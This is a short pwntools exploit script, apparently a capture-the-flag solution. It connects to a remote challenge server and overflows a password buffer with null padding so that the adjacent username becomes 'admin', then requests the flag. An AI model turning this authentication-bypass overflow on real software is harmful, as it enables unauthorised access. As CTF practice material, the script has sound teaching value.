#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("pwn")

local = False 
if local:
    p = process("./pwn")
    gdb.attach(p,'''''')
else:
    p = remote('139.180.137.100', 1337)

elf = context.binary = ELF('./pwn', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

def flag():
    sla(b"3. Exit", b"4")


sla(b"3. Exit", b"2")
sla(b"Enter your username:",  b"admi")
sla(b"Enter your passwd:", b"abc" + b"\x00"*(0x40-3)+b"admin")

flag()
p.interactive()